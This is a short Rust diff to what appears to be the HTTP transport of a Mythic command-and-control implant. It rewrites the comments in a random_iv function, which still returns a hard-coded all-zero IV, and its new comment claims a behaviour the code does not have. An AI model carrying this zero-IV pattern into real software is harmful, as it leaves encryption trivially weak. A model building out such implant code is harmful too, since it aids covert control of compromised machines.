@@ -25,12 +25,10 @@ impl C2Transport for HttpC2 {
         self.key_b64.clone()
     }
 
+    // 加密时覆盖 random_iv 提供真随机 IV（默认返回 Crypto 错误）
     fn random_iv(&self) -> Result<[u8; 16], MythicError> {
-        let iv = [0u8; 16];
-        // In a real implant, fill with cryptographically random bytes
-        // (e.g. `getrandom::getrandom(&mut iv)` or a platform TRNG).
-        // Zero IV is only safe for plaintext transports.
-        Ok(iv)
+        // 实际部署: getrandom::getrandom(&mut iv)?; Ok(iv)
+        Ok([0u8; 16]) // 演示用零 IV
     }
 
     fn checkin(&self, pkt: &str) -> Result<String, MythicError> {
